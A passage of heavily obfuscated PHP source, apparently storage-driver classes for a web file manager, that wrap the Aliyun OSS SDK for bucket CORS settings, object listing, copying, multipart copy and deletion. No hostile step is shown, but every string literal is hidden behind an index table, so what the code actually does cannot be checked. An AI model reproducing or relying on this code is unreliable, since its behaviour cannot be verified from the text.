$dùŠöÛô§ =& $DÉÜ‹·Ç¦µ[$E÷ë‘õğÉ[$B°Ó»ñ¹áŞ[169]]]; foreach ($dùŠöÛô§ as &$b©ÚÑ”´‰) { $b©ÚÑ”´‰[$B°Ó»ñ¹áŞ[441]] = $E÷ë‘õğÉ[$B°Ó»ñ¹áŞ[441]]; } unset($b©ÚÑ”´‰); } $dÓÁ†œöÚ· = array(); goto DŠ¥ƒôÁ¢ã; d²ÔˆÁç““: $cºœ§×æğ = Model($B°Ó»ñ¹áŞ[566]); $cÆåÒ¹Ìµ† = $cºœ§×æğ->where($fŸæì¶ÍŸ¤)->select(); $cÆåÒ¹Ìµ† = $cÆåÒ¹Ìµ† ? $cÆåÒ¹Ìµ† : array(); goto fÚ‚¸¸²õ; Cƒ†§Ê½ñÃ: foreach ($C‚ñÊù‹ˆ´ as &$b©ÚÑ”´‰) { goto Få‘…ÀÒ; Få‘…ÀÒ: Hook::trigger($B°Ó»ñ¹áŞ[564], $b©ÚÑ”´‰); $b©ÚÑ”´‰[$B°Ó»ñ¹áŞ[75]] = $d†”à¢¬‹°->getPathInner($b©ÚÑ”´‰[$B°Ó»ñ¹áŞ[75]]); $e‡Ş²†¼ù = $d†”à¢¬‹°->hashSimple($b©ÚÑ”´‰[$B°Ó»ñ¹áŞ[75]]); goto FŒñ”›Š’Ù; EøÏ‹ÖùÆ‰: if (count($DÉÜ‹·Ç¦µ[$e¿èÀåİ]) > 1) { $b©ÚÑ”´‰[$B°Ó»ñ¹áŞ[563]] = !0; } goto d°ìÅ•ÕˆÓ; DŒ˜¯Ïª»Ì: $b©ÚÑ”´‰[$B°Ó»ñ¹áŞ[169]] = $e¿èÀåİ; Hook::trigger($B°Ó»ñ¹áŞ[565], $b©ÚÑ”´‰); $DÉÜ‹·Ç¦µ[$e¿èÀåİ][] =& $b©ÚÑ”´‰; goto EøÏ‹ÖùÆ‰; FŒñ”›Š’Ù: $e¿èÀåİ = $d†”à¢¬‹°->hashMd5($b©ÚÑ”´‰[$B°Ó»ñ¹áŞ[75]]); if (strlen($e¿èÀåİ) > 10 && !isset($DÉÜ‹·Ç¦µ[$e¿èÀåİ])) { $DÉÜ‹·Ç¦µ[$e¿èÀåİ] = array(); } $b©ÚÑ”´‰[$B°Ó»ñ¹áŞ[170]] = $e‡Ş²†¼ù; goto DŒ˜¯Ïª»Ì; d°ìÅ•ÕˆÓ: } unset($b©ÚÑ”´‰); $fŸæì¶ÍŸ¤ = array($B°Ó»ñ¹áŞ[169] => array($B°Ó»ñ¹áŞ[7], array_keys($DÉÜ‹·Ç¦µ))); goto d²ÔˆÁç““; DŠ¥ƒôÁ¢ã: foreach ($C‚ñÊù‹ˆ´ as $a¼çÖë™ç) { $dÓÁ†œöÚ·[$a¼çÖë™ç[$B°Ó»ñ¹áŞ[28]]] = $a¼çÖë™ç; } return $dÓÁ†œöÚ·; goto dÉÂİ÷¬¿; fÚ‚¸¸²õ: foreach ($cÆåÒ¹Ìµ† as $E÷ë‘õğÉ) { if (!isset($DÉÜ‹·Ç¦µ[$E÷ë‘õğÉ[$B°Ó»ñ¹áŞ[169]]])) { continue; } $AÁàÒ¸‚…¹ = $DÉÜ‹·Ç¦µ[$E÷ë‘õğÉ[$B°Ó»ñ¹áŞ[169]]]; foreach ($AÁàÒ¸‚…¹ as &$b©ÚÑ”´‰) { $b©ÚÑ”´‰[$B°Ó»ñ¹áŞ[441]] = $E÷ë‘õğÉ[$B°Ó»ñ¹áŞ[441]]; $b©ÚÑ”´‰[$B°Ó»ñ¹áŞ[563]] = !0; } unset($b©ÚÑ”´‰); } $FŒ¸®Ñâ„ª = array(); foreach ($C‚ñÊù‹ˆ´ as $dÍÂÈ‰ªó) { if (isset($dÍÂÈ‰ªó[$B°Ó»ñ¹áŞ[563]]) && $dÍÂÈ‰ªó[$B°Ó»ñ¹áŞ[563]]) { continue; } $aøó©Ü·¹ = $d†”à¢¬‹°->getPathInner($dÍÂÈ‰ªó[$B°Ó»ñ¹áŞ[75]]); $B®æ‘Ô°ªĞ = $cºœ§×æğ->addFileMake($aøó©Ü·¹, $dÍÂÈ‰ªó[$B°Ó»ñ¹áŞ[77]], $dÍÂÈ‰ªó[$B°Ó»ñ¹áŞ[170]], $dÍÂÈ‰ªó[$B°Ó»ñ¹áŞ[169]], $dÍÂÈ‰ªó[$B°Ó»ñ¹áŞ[28]], $bõèˆøä°ª); $FŒ¸®Ñâ„ª[] = $B®æ‘Ô°ªĞ; } goto E×˜äÌ˜‹; dÉÂİ÷¬¿: } } define($_SERVER[¹Ò‹Ò¹][567], $_SERVER[¹Ò‹Ò¹][568]); goto d™Ú—­™; Fµ¥´œ—ò•: define($_SERVER[¹Ò‹Ò¹][235], 2); define($_SERVER[¹Ò‹Ò¹][236], 3); define($_SERVER[¹Ò‹Ò¹][237], 1); goto E¡¿ššô¬–; dÂ»â‰Å«æ: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($EóâëÙŒ¶) { parent::__construct($EóâëÙŒ¶); $this->signatureVersion($_SERVER[¹Ò‹Ò¹][210]); } public function fileOutLink($dÑ¤½×¼ö) { $cã–³Ê“¤Ê =& $_SERVER[¹Ò‹Ò¹]; if (substr($dÑ¤½×¼ö, 0, 7) == $cã–³Ê“¤Ê[1177]) { $dÑ¤½×¼ö = $cã–³Ê“¤Ê[1178] . substr($dÑ¤½×¼ö, 7); } header($cã–³Ê“¤Ê[158] . $dÑ¤½×¼ö); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($BÃº˜ğø»â) { parent::__construct(); include_once SDK_DIR . $_SERVER[¹Ò‹Ò¹][1235]; $this->_init($BÃº˜ğø»â); } public function _init($BáêÏ¼“óÂ) { $fƒ×Ö­Ë†£ =& $_SERVER[¹Ò‹Ò¹]; foreach ($BáêÏ¼“óÂ as $cè¿Õºø×Ç => $Bª•ø½Ğ©î) { if (isset($this->{$cè¿Õºø×Ç})) { $this->{$cè¿Õºø×Ç} = $Bª•ø½Ğ©î; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($fƒ×Ö­Ë†£[1236] . LNG($fƒ×Ö­Ë†£[1237])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto fŠ–ÊÖ°ª„; bî“Æõ³•: $eØ¹¹ƒåÈø->addRule($Fá‹‚¥™¦Ù); try { $this->client->putBucketCors($this->bucket, $eØ¹¹ƒåÈø); } catch (OSS\Core\OssException $b•¹›œ¦Ëì) { return !1; } return !0; goto C¥øô¡»³; Aøá™æó–: $Fá‹‚¥™¦Ù->addAllowedMethod($B‡ª‰ôÈ´[1241]); $Fá‹‚¥™¦Ù->addAllowedMethod($B‡ª‰ôÈ´[1242]); $Fá‹‚¥™¦Ù->addAllowedMethod($B‡ª‰ôÈ´[157]); goto bº¤œºĞä»; fŠ–ÊÖ°ª„: $B‡ª‰ôÈ´ =& $_SERVER[¹Ò‹Ò¹]; $eØ¹¹ƒåÈø = new OSS\Model\CorsConfig(); $Fá‹‚¥™¦Ù = new OSS\Model\CorsRule(); goto cïˆÅõÌ†î; cïˆÅõÌ†î: $Fá‹‚¥™¦Ù->addAllowedOrigin($B‡ª‰ôÈ´[1238]); $Fá‹‚¥™¦Ù->addAllowedMethod($B‡ª‰ôÈ´[1239]); $Fá‹‚¥™¦Ù->addAllowedMethod($B‡ª‰ôÈ´[1240]); goto Aøá™æó–; bº¤œºĞä»: $Fá‹‚¥™¦Ù->setMaxAgeSeconds(600); $Fá‹‚¥™¦Ù->addExposeHeader($B‡ª‰ôÈ´[1243]); $Fá‹‚¥™¦Ù->addAllowedHeader($B‡ª‰ôÈ´[1238]); goto bî“Æõ³•; C¥øô¡»³: } public function getBucketCors() { goto dƒã³±­ÛÏ; FéßŸÅâÊ¸: return array($AĞÁ’¥ß‚[180] => isset($BŒ”–âÕò[0]) ? $BŒ”–âÕò[0] : $AĞÁ’¥ß‚[33], $AĞÁ’¥ß‚[184] => $aÁ¹ÆÎ­º, $AĞÁ’¥ß‚[1244] => $D¢ƒš¦¾¬º, $AĞÁ’¥ß‚[1245] => isset($cö£Ğ•›é[0]) ? $cö£Ğ•›é[0] : $AĞÁ’¥ß‚[33], $AĞÁ’¥ß‚[182] => isset($EÎ«¨í³†¨[0]) ? $EÎ«¨í³†¨[0] : $AĞÁ’¥ß‚[33]); goto f‘ª½ëåÂ²; dƒã³±­ÛÏ: $AĞÁ’¥ß‚ =& $_SERVER[¹Ò‹Ò¹]; $F­Ñ±Áºñá = null; try { $F­Ñ±Áºñá = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $a…Ê ›­ÎÖ) { return null; } goto f·ÂÛí¾ˆ; C ¡²³øİ: $D¢ƒš¦¾¬º = $cÖ½ëéÅĞä[0]->getMaxAgeSeconds(); $cö£Ğ•›é = $cÖ½ëéÅĞä[0]->getExposeHeaders(); $EÎ«¨í³†¨ = $cÖ½ëéÅĞä[0]->getAllowedHeaders(); goto FéßŸÅâÊ¸; f·ÂÛí¾ˆ: if (!$F­Ñ±Áºñá || !($cÖ½ëéÅĞä = $F­Ñ±Áºñá->getRules())) { return null; } $BŒ”–âÕò = $cÖ½ëéÅĞä[0]->getAllowedOrigins(); $aÁ¹ÆÎ­º = $cÖ½ëéÅĞä[0]->getAllowedMethods(); goto C ¡²³øİ; f‘ª½ëåÂ²: } public function isBucketCors() { goto C¾‘È…‚; B„‹®¢©Ï½: if ($a„–Ğ©³Óä[$Dê‡äŞ¿[180]] != $Dê‡äŞ¿[181] || $a„–Ğ©³Óä[$Dê‡äŞ¿[182]] != $Dê‡äŞ¿[181]) { return !1; } $aÒŒœâÔ‚¥ = array_map($Dê‡äŞ¿[183], $a„–Ğ©³Óä[$Dê‡äŞ¿[184]]); if (!is_array($aÒŒœâÔ‚¥)) { $aÒŒœâÔ‚¥ = array(); } goto aÉĞšˆ…§Ï; C¾‘È…‚: $Dê‡äŞ¿ =& $_SERVER[¹Ò‹Ò¹]; $a„–Ğ©³Óä = $this->getBucketCors(); if (!$a„–Ğ©³Óä || !is_array($a„–Ğ©³Óä)) { return !1; } goto B„‹®¢©Ï½; aÉĞšˆ…§Ï: $cÛ¯±Úâ†ß = array($Dê‡äŞ¿[185], $Dê‡äŞ¿[186], $Dê‡äŞ¿[187], $Dê‡äŞ¿[188], $Dê‡äŞ¿[189]); $dîñÆ’Š· = array_diff($cÛ¯±Úâ†ß, $aÒŒœâÔ‚¥); return empty($dîñÆ’Š·); goto B­Û÷“ÛÓì; B­Û÷“ÛÓì: } public function mkfile($d‡Í×™Îê, $FÑİÃäç×å = '', $D¿‘ëóÏÔÍ = REPEAT_RENAME) { $cæñ…Š¯Ùà = $this->setContent($d‡Í×™Îê, $FÑİÃäç×å); if ($cæñ…Š¯Ùà !== !1) { return $this->getPathOuter($d‡Í×™Îê); } return !1; } public function mkdir($f§Øï¨×, $D å²¨¹“ = REPEAT_SKIP) { if ($this->_isFolder($f§Øï¨×)) { return $this->getPathOuter($f§Øï¨×); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($f§Øï¨×)); } catch (OSS\Core\OssException $cˆÌà÷Ñë) { return !1; } return $this->getPathOuter($f§Øï¨×); } private function fileList($C»«Ã Î†, $f¡œøŠö¢Ô = '', $Fë©×æóø§ = 0) { goto Aİš¤°Èê‰; bëíÜ¶­íå: $CÂÑĞÂŸîÚ = $AãÑ¬¡”ŞÓ = array(); while (!0) { check_abort(); $DÕÀÈ»î„Œ = array($FÜ“Á—Ÿ»æ[1246] => $f¡œøŠö¢Ô, $FÜ“Á—Ÿ»æ[1247] => $d°èì®’³µ, $FÜ“Á—Ÿ»æ[1248] => $D£µ‹é´Ë›, $FÜ“Á—Ÿ»æ[1249] => $DÃôãÏğÈ); try { $e®­¬Ê¾±¼ = $this->client->listObjects($this->bucket, $DÕÀÈ»î„Œ); } catch (OSS\Core\OssException $BİÌ¤ˆÜ…Ü) { break; } $DÃôãÏğÈ = $e®­¬Ê¾±¼->getNextMarker(); $c¡¸ø…Éî = $e®­¬Ê¾±¼->getObjectList(); $D¹ÄÇÉÙÛŠ = $e®­¬Ê¾±¼->getPrefixList(); foreach ($c¡¸ø…Éî as $D†¯Ô»ğšé) { goto däØØôÔáØ; eİÃŸ«ˆ¡à: $dÅÕµÔ„Â = $D†¯Ô»ğšé->getLastModified(); $A±ÍÒÈÏÜæ = $Fë©×æóø§ ? array($FÜ“Á—Ÿ»æ[28] => $dÂğó®†Ê, $FÜ“Á—Ÿ»æ[77] => $A²øˆ¶õ¼”, $FÜ“Á—Ÿ»æ[195] => strtotime($dÅÕµÔ„Â)) : $dÂğó®†Ê; $E”¢¡Õ¯¿§ = $A²øˆ¶õ¼” == 0 && substr($dÂğó®†Ê, strlen($dÂğó®†Ê) - 1, 1) == $FÜ“Á—Ÿ»æ[8] ? !0 : !1; goto B‹ÚœˆŸ·Ì; B‹ÚœˆŸ·Ì: if ($CŠíã—İè‘) { $this->cacheMethod($FÜ“Á—Ÿ»æ[197], $dÂğó®†Ê, $E”¢¡Õ¯¿§); $this->cacheMethod($FÜ“Á—Ÿ»æ[198], $dÂğó®†Ê, array($FÜ“Á—Ÿ»æ[77] => $A²øˆ¶õ¼”, $FÜ“Á—Ÿ»æ[1250] => $A²øˆ¶õ¼”, $FÜ“Á—Ÿ»æ[83] => strtotime($dÅÕµÔ„Â), $FÜ“Á—Ÿ»æ[1251] => $dÅÕµÔ„Â)); } if ($E”¢¡Õ¯¿§) { $CÂÑĞÂŸîÚ[] = $dÂğó®†Ê; continue; } $AãÑ¬¡”ŞÓ[] = $A±ÍÒÈÏÜæ; goto cÂ¤‚—œÆÜ; däØØôÔáØ: if ($D†¯Ô»ğšé->getKey() == $d°èì®’³µ) { continue; } $dÂğó®†Ê = $D†¯Ô»ğšé->getKey(); $A²øˆ¶õ¼” = $D†¯Ô»ğšé->getSize(); goto eİÃŸ«ˆ¡à; cÂ¤‚—œÆÜ: } foreach ($D¹ÄÇÉÙÛŠ as $e’Ã¸ˆÎ¥) { $CÂÑĞÂŸîÚ[] = $e’Ã¸ˆÎ¥->getPrefix(); if ($CŠíã—İè‘) { $this->cacheMethod($FÜ“Á—Ÿ»æ[197], $dÂğó®†Ê, !0); } } if ($DÃôãÏğÈ === $FÜ“Á—Ÿ»æ[33]) { break; } } if ($CŠíã—İè‘) { $this->cacheMethod($FÜ“Á—Ÿ»æ[197], $C»«Ã Î†, !0); } goto b­ŞÏ¶¬˜Í; bâ•¥ò×ÁÏ: $DÃôãÏğÈ = $FÜ“Á—Ÿ»æ[33]; $D£µ‹é´Ë› = 1000; $CŠíã—İè‘ = $this->listItemCache === !1 ? !1 : !0; goto bëíÜ¶­íå; b­ŞÏ¶¬˜Í: return array($FÜ“Á—Ÿ»æ[74] => $CÂÑĞÂŸîÚ, $FÜ“Á—Ÿ»æ[73] => $AãÑ¬¡”ŞÓ); goto fÜŞ«šÍÓ; Aİš¤°Èê‰: $FÜ“Á—Ÿ»æ =& $_SERVER[¹Ò‹Ò¹]; $C»«Ã Î† = trim($C»«Ã Î†, $FÜ“Á—Ÿ»æ[8]); $d°èì®’³µ = empty($C»«Ã Î†) ? $FÜ“Á—Ÿ»æ[33] : $C»«Ã Î† . $FÜ“Á—Ÿ»æ[8]; goto bâ•¥ò×ÁÏ; fÜŞ«šÍÓ: } public function copyFile($BÊ¸Å©½ó³, $a§—áŸŒ›·) { $aÉÑ¡¬Á¥Î = $this->size($BÊ¸Å©½ó³); if ($aÉÑ¡¬Á¥Î < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $BÊ¸Å©½ó³, $this->bucket, $this->pathEncode($a§—áŸŒ›·)); } catch (OSS\Core\OssException $bìŒŞÂğÉÊ) { return !1; } return $this->getPathOuter($a§—áŸŒ›·); } $aÂÙô¿åÂ = $this->multiCopyObject($BÊ¸Å©½ó³, $a§—áŸŒ›·, $aÉÑ¡¬Á¥Î); return $aÂÙô¿åÂ ? $this->getPathOuter($a§—áŸŒ›·) : !1; } private function multiCopyObject($aÁ´Š‰Âé, $EÔ•®ŒÆ÷‡, $eÂ›Ú•´ÙÛ) { $E¬Ùå¦°âÚ =& $_SERVER[¹Ò‹Ò¹]; try { goto FÅëïœ; eŞÁÌèÅ: $a¤ÛßÍÔˆ· = array(); foreach ($dÄñÕ µÁ as $aõë¯¡ÚÊ‰ => $DàˆöñòÔ­) { $a¤ÛßÍÔˆ·[] = array($E¬Ùå¦°âÚ[1256] => $aõë¯¡ÚÊ‰ + 1, $E¬Ùå¦°âÚ[1257] => $DàˆöñòÔ­); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($EÔ•®ŒÆ÷‡), $B…‰ƒ¢–ğ, $a¤ÛßÍÔˆ·); goto aÕ´¸³‰øì; a¶­Ìâ³ñ–: $b¹‹Ôá©ˆÃ = 1024 * 1024 * 10; $f¾îË†…ó = $this->client->generateMultiuploadParts($eÂ›Ú•´ÙÛ, $b¹‹Ôá©ˆÃ); foreach ($f¾îË†…ó as $aõë¯¡ÚÊ‰ => $AÇó¢ÛöØ ) { $f¼Œ‘¼¦ß = $cÛºÔ¢»Úó + (int) $AÇó¢ÛöØ [$E¬Ùå¦°âÚ[1253]]; $CëĞëĞ”Ï» = (int) $AÇó¢ÛöØ [$E¬Ùå¦°âÚ[333]] + $f¼Œ‘¼¦ß - 1; $aŠ¸¸ëÅÚ‘ = array($E¬Ùå¦°âÚ[1254] => $f¼Œ‘¼¦ß, $E¬Ùå¦°âÚ[1255] => $CëĞëĞ”Ï»); $dÄñÕ µÁ[] = $this->client->uploadPartCopy($this->bucket, $aÁ´Š‰Âé, $this->bucket, $this->pathEncode($EÔ•®ŒÆ÷‡), $d¸’İòœâ, $B…‰ƒ¢–ğ, $aŠ¸¸ëÅÚ‘); $d¸’İòœâ = $d¸’İòœâ + 1; } goto eŞÁÌèÅ; A×ôèì­¸Ü: $d¸’İòœâ = 1; $cÛºÔ¢»Úó = 0; $dÄñÕ µÁ = array(); goto a¶­Ìâ³ñ–; FÅëïœ: $F›Ë²Œ‰°Ò = array(); if ($D­‰ĞñŞÉ± = $this->hashMd5($aÁ´Š‰Âé)) { $F›Ë²Œ‰°Ò = array(OSS\OssClient::OSS_HEADERS => array($E¬Ùå¦°âÚ[1252] => $D­‰ĞñŞÉ±)); } $B…‰ƒ¢–ğ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($EÔ•®ŒÆ÷‡), $F›Ë²Œ‰°Ò); goto A×ôèì­¸Ü; aÕ´¸³‰øì: } catch (OSS\Core\OssException $eŸÃº’Ó) { return !1; } return !0; } public function moveFile($c© ÎÒ§·Ú, $aö©Úª¢Ğó) { if ($this->copyFile($c© ÎÒ§·Ú, $aö©Úª¢Ğó)) { $this->remove($c© ÎÒ§·Ú); return $this->getPathOuter($aö©Úª¢Ğó); } return !1; } public function delFile($BÂàõÖõ»°) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($BÂàõÖõ»°)); } catch (OSS\Core\OssException $DÌ°”ˆª¦‰) { return !1; } return !0; } public function delFolder($d­Ã›Ğâ¦Ì) { goto DÍšÅœ´ù; dÓ‰³›‡‰: return $this->delByBatch($AÚìÍÊ¡Àó[$f‰³‹×ù[74]]); goto e¹¦Ãñ»‚; DÄ»ŞÑ‰Šœ: $AÚìÍÊ¡Àó = $this->fileList($d­Ã›Ğâ¦Ì); $this->listItemCache = !0; $fËˆ”Ó¨Â = trim($d­Ã›Ğâ¦Ì, $f‰³‹×ù[8]) . $f‰³‹×ù[8]; goto D¤ƒİÚ§§; D¤ƒİÚ§§: if (!empty($d­Ã›Ğâ¦Ì) && !in_array($fËˆ”Ó¨Â, $AÚìÍÊ¡Àó[$f‰³‹×ù[74]])) { $AÚìÍÊ¡Àó[$f‰³‹×ù[74]][] = $fËˆ”Ó¨Â; } $C¬œõê»©“ = $this->delByBatch($AÚìÍÊ¡Àó[$f‰³‹×ù[73]]); if (!$C¬œõê»©“) { return !1; } goto dÓ‰³›‡‰; DÍšÅœ´ù: $f‰³‹×ù =& $_SERVER[¹Ò‹Ò¹]; if (!$this->exist($d­Ã›Ğâ¦Ì)) { return !0; } $this->listItemCache = !1; goto DÄ»ŞÑ‰Šœ; e¹¦Ãñ»‚: } private function delByBatch($F³¾¼‹¹†ï) { foreach (array_chunk($F³¾¼‹¹†ï, 1000) as $E©Šø°­†) { try { $this->client->deleteObjects($this->bucket, $E©Šø°­†); } catch (OSS\Core\OssException $F”âîî•ÀØ) { return !1; } } return !0; } public function rename($d¦ì„êµ³, $FÁ¬à·ğŠ) { return $this->renameObject($d¦ì„êµ³, $FÁ¬à·ğŠ); } private function fileInfo($AŒÏÃÖ¤”¶, $Aè‹÷‰ÁŸÁ = false, $eâÉÕïÕá© = array()) { goto E÷•‡ğÌ¤Á; EšÂ¤ä“³‰: return $cÑŠİÖ¬«ª; goto FôùÊÎÃË; eƒÂÍ‘˜Û: if (isset($eâÉÕïÕá©[$aôê‚»ïˆÊ[77]])) { $cÑŠİÖ¬«ª[$aôê‚»ïˆÊ[77]] = $eâÉÕïÕá©[$aôê‚»ïˆÊ[77]]; } if (isset($eâÉÕïÕá©[$aôê‚»ïˆÊ[83]])) { $cÑŠİÖ¬«ª[$aôê‚»ïˆÊ[83]] = $eâÉÕïÕá©[$aôê‚»ïˆÊ[83]]; } if (isset($eâÉÕïÕá©[$aôê‚»ïˆÊ[195]]) && !trim($cÑŠİÖ¬«ª[$aôê‚»ïˆÊ[83]])) { $cÑŠİÖ¬«ª[$aôê‚»ïˆÊ[83]] = $eâÉÕïÕá©[$aôê‚»ïˆÊ[195]]; } goto EšÂ¤ä“³‰; fÄæœ§‘¡: $cÑŠİÖ¬«ª[$aôê‚»ïˆÊ[192]] = $cÑŠİÖ¬«ª[$aôê‚»ïˆÊ[83]] = 0; $cÑŠİÖ¬«ª[$aôê‚»ïˆÊ[193]] = $cÑŠİÖ¬«ª[$aôê‚»ïˆÊ[194]] = !0; if (empty($eâÉÕïÕá©)) { $c·¶©¬‡ã = $this->objectMeta($AŒÏÃÖ¤”¶); if (!$c·¶©¬‡ã) { return $cÑŠİÖ¬«ª; } $eâÉÕïÕá© = array($aôê‚»ïˆÊ[83] => strtotime($c·¶©¬‡ã[$aôê‚»ïˆÊ[1251]]), $aôê‚»ïˆÊ[77] => $c·¶©¬‡ã[$aôê‚»ïˆÊ[1250]] + 0); } goto eƒÂÍ‘˜Û; E÷•‡ğÌ¤Á: $aôê‚»ïˆÊ =& $_SERVER[¹Ò‹Ò¹]; $cÑŠİÖ¬«ª = array($aôê‚»ïˆÊ[28] => $this->pathThis($AŒÏÃÖ¤”¶), $aôê‚»ïˆÊ[75] => $this->getPathOuter($AŒÏÃÖ¤”¶), $aôê‚»ïˆÊ[29] => $aôê‚»ïˆÊ[191], $aôê‚»ïˆÊ[77] => isset($eâÉÕïÕá©[$aôê‚»ïˆÊ[77]]) ? $eâÉÕïÕá©[$aôê‚»ïˆÊ[77]] : 0, $aôê‚»ïˆÊ[167] => $this->ext($AŒÏÃÖ¤”¶)); if ($Aè‹÷‰ÁŸÁ) { return $cÑŠİÖ¬«ª; } goto fÄæœ§‘¡; FôùÊÎÃË: } private function folderInfo($DÂŠ›¼Ë, $d²¥†áÒÜ‘ = false, $cÛ…ˆœµò‹ = array()) { goto Eí „àöÃƒ; Eí „àöÃƒ: $F¿íÌÒË± =& $_SERVER[¹Ò‹Ò¹]; $EÆ”ğ¨±Ğ¤ = array($F¿íÌÒË±[28] => $this->pathThis($DÂŠ›¼Ë), $F¿íÌÒË±[75] => $this->getPathOuter($F¿íÌÒË±[8] . $DÂŠ›¼Ë), $F¿íÌÒË±[29] => $F¿íÌÒË±[76]); if ($d²¥†áÒÜ‘) { return $EÆ”ğ¨±Ğ¤; } goto FÀë–Û…İ; FÀë–Û…İ: $EÆ”ğ¨±Ğ¤[$F¿íÌÒË±[192]] = $EÆ”ğ¨±Ğ¤[$F¿íÌÒË±[83]] = 0; $EÆ”ğ¨±Ğ¤[$F¿íÌÒË±[193]] = $EÆ”ğ¨±Ğ¤[$F¿íÌÒË±[194]] = !0; if (empty($cÛ…ˆœµò‹)) { $DÂŠ›¼Ë = rtrim($DÂŠ›¼Ë, $F¿íÌÒË±[8]) . $F¿íÌÒË±[8]; $Aàñ½Š—è = $this->objectMeta($DÂŠ›¼Ë); if (!$Aàñ½Š—è) { return $EÆ”ğ¨±Ğ¤; } $cÛ…ˆœµò‹ = array($F¿íÌÒË±[192] => $Aàñ½Š—è[$F¿íÌÒË±[1258]][$F¿íÌÒË±[1259]], $F¿íÌÒË±[83] => strtotime($Aàñ½Š—è[$F¿íÌÒË±[1251]])); } goto BË˜’ê¨Ş¿; BË˜’ê¨Ş¿: if (isset($cÛ…ˆœµò‹[$F¿íÌÒË±[83]])) { $EÆ”ğ¨±Ğ¤[$F¿íÌÒË±[83]] = $cÛ…ˆœµò‹[$F¿íÌÒË±[83]]; } if (isset($cÛ…ˆœµò‹[$F¿íÌÒË±[192]])) { $EÆ”ğ¨±Ğ¤[$F¿íÌÒË±[192]] = $cÛ…ˆœµò‹[$F¿íÌÒË±[192]]; } return $EÆ”ğ¨±Ğ¤; goto E¸Ú×³‚¹; E¸Ú×³‚¹: } public function listPath($AÊêŞÍµ¼¶, $E®‹Í—Èä = false) { $d‡ù„•™„ =& $_SERVER[¹Ò‹Ò¹]; $fïéŒ¸˜”· = $this->fileList($AÊêŞÍµ¼¶, $d‡ù„•™„[8], !0); foreach ($fïéŒ¸˜”·[$d‡ù„•™„[74]] as $a©­²«Úù• => $E“ç¹²™¶Ş) { $fïéŒ¸˜”·[$d‡ù„•™„[74]][$a©­²«Úù•] = $this->folderInfo($E“ç¹²™¶Ş, $E®‹Í—Èä, $E“ç¹²™¶Ş); } foreach ($fïéŒ¸˜”·[$d‡ù„•™„[73]] as $a©­²«Úù• => $E“ç¹²™¶Ş) { $fïéŒ¸˜”·[$d‡ù„•™„[73]][$a©­²«Úù•] = $this->fileInfo($E“ç¹²™¶Ş[$d‡ù„•™„[28]], $E®‹Í—Èä, $E“ç¹²™¶Ş); } return $fïéŒ¸˜”·; } public function has($dßî¬æª¸¦, $e„ñƒíß…İ = false, $Fµ£¡Üã± = true) { goto AÙµèà¹ä; AÙµèà¹ä: $A’æğä¼¿° =& $_SERVER[¹Ò‹Ò¹]; $dßî¬æª¸¦ = trim($dßî¬æª¸¦, $A’æğä¼¿°[8]); $Dãç›ğÒ†ï = empty($dßî¬æª¸¦) ? $A’æğä¼¿°[33] : $dßî¬æª¸¦ . $A’æğä¼¿°[8]; goto AôÅ´¼ÄÇ; fÖÇÁé‡: while (!0) { check_abort(); $E»²œ—˜ = array($A’æğä¼¿°[1246] => $A’æğä¼¿°[8], $A’æğä¼¿°[1247] => $Dãç›ğÒ†ï, $A’æğä¼¿°[1248] => $e£´²¸öñÆ, $A’æğä¼¿°[1249] => $Cïà¥ñÛê°); try { $DœÍÑ´Ğ‡” = $this->client->listObjects($this->bucket, $E»²œ—˜); } catch (OSS\Core\OssException $d¿Šº“µ—¤) { break; } $Cïà¥ñÛê° = $DœÍÑ´Ğ‡”->getNextMarker(); $aÆÛ—æ›© = $DœÍÑ´Ğ‡”->getObjectList(); $F‚Ô•‹˜Ï = $DœÍÑ´Ğ‡”->getPrefixList(); if ($e„ñƒíß…İ) { if (count($aÆÛ—æ›©) > 1 || count($aÆÛ—æ›©) == 1 && $aÆÛ—æ›©[0]->getKey() != $Dãç›ğÒ†ï) { $D—Óù½Á„À += count($aÆÛ—æ›©) - 1; } if (!empty($F‚Ô•‹˜Ï)) { $b”ÔÃ‹èğ‚ += count($F‚Ô•‹˜Ï); } if ($Cïà¥ñÛê° === $A’æğä¼¿°[33]) { break; } continue; } if ($Fµ£¡Üã±) { if (!empty($aÆÛ—æ›©)) { if (count($aÆÛ—æ›©) > 1 || $aÆÛ—æ›©[0]->getKey() != $Dãç›ğÒ†ï) { return !0; } } } else { if (!empty($F‚Ô•‹˜Ï)) { return !0; } } if ($Cïà¥ñÛê° === $A’æğä¼¿°[33]) { break; } } if ($e„ñƒíß…İ) { return array($A’æğä¼¿°[201] => $D—Óù½Á„À, $A’æğä¼¿°[202] => $b”ÔÃ‹èğ‚); } return !1; goto a‚ò±âÒê; AôÅ´¼ÄÇ: $Cïà¥ñÛê° = $A’æğä¼¿°[33]; $e£´²¸öñÆ = 500; $D—Óù½Á„À = $b”ÔÃ‹èğ‚ = 0; goto fÖÇÁé‡; a‚ò±âÒê: } public function listAll($Aë˜»Ó «•) { $fºÒä÷òÊ =& $_SERVER[¹Ò‹Ò¹]; $Dù¹îË— = $this->fileList($Aë˜»Ó «•, $fºÒä÷òÊ[33], !0); $a„Û˜””öÛ = array(); foreach ($Dù¹îË—[$fºÒä÷òÊ[73]] as $EÌùÑ‹ä¸Ù) { $a„Û˜””öÛ[$EÌùÑ‹ä¸Ù[$fºÒä÷òÊ[28]]] = $EÌùÑ‹ä¸Ù[$fºÒä÷òÊ[77]]; } foreach ($Dù¹îË—[$fºÒä÷òÊ[74]] as $EÌùÑ‹ä¸Ù) { if (is_string($EÌùÑ‹ä¸Ù)) { $a„Û˜””öÛ[$EÌùÑ‹ä¸Ù] = 0; } } return $this->listAllFiles($Aë˜»Ó «•, array_keys($a„Û˜””öÛ), $a„Û˜””öÛ); } public function canRead($C®ÂÎİ²Ú”) { $eøã«’§ªù =& 